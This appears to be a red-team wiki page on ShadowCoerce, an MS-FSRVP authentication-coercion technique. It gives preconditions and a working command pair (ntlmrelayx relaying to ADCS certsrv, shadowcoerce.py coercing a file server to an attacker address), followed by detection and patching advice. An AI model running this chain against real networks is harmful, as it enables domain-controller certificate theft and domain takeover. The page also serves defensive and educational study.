---
title: ShadowCoerce (MS-FSRVP Authentication Coercion)
slug: shadowcoerce
---

> **TL;DR:** Call `IsPathSupported` or `IsPathShadowCopied` on the MS-FSRVP `\pipe\FssagentRpc` endpoint with a UNC path pointing at the attacker — the target's machine account authenticates back over SMB, ready to be relayed to [[adcs-attacks|ADCS]].

## What it is
ShadowCoerce abuses the **File Server Remote VSS Protocol (MS-FSRVP)** exposed by the *File Server VSS Agent Service*. Two RPC methods accept a remote share path and trigger an outbound SMB connection that performs NTLM authentication as the computer account. Combined with [[ntlm|NTLM]] relay to `certsrv` it yields a domain controller machine certificate and full domain compromise.

## Preconditions / where it applies
- Any valid domain user (low-priv) — auth is required to bind to the named pipe
- Target has the **File Server VSS Agent Service** feature installed (common on file servers; *not* default on DCs but found in many estates)
- Coerced auth lands over SMB → relay needs a target that accepts NTLM and does not enforce SMB/EPA signing; [[ntlm-relay-ws2025-mitigations]] applies

## Technique
Use the public `ShadowCoerce.py` PoC (Impacket-based) to invoke `IsPathSupported`. Listen with `ntlmrelayx` on the relay target.

```bash
# terminal 1 — relay machine-account auth to ADCS web enrolment
ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp \
              --adcs --template DomainController -smb2support

# terminal 2 — coerce the file server (FS01) to auth to us (10.0.0.5)
python3 shadowcoerce.py -u alice -p 'P@ss' -d corp.local 10.0.0.5 fs01.corp.local
```

If the first call returns `ERROR_BAD_NETPATH` retry — the FssAgent service is on-demand and sometimes needs warming. Multiple attempts are normal.

## Detection and defence
- Patch **CVE-2022-30154 / KB5014692** (June 2022) — Microsoft silently added authentication requirements to FSRVP RPC
- Sysmon network EID **3** outbound SMB from servers to unexpected hosts; Windows EID **5145** for `\\attacker\share` access by `MACHINE$`
- Enforce SMB signing + Extended Protection for Authentication on `certsrv`, disable NTLM on the CA, and unbind the File Server VSS Agent Service where unused

## References
- [The Hacker Recipes — MS-FSRVP abuse (ShadowCoerce)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp) — canonical writeup
- [ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce) — original PoC by @_nwodtuhs
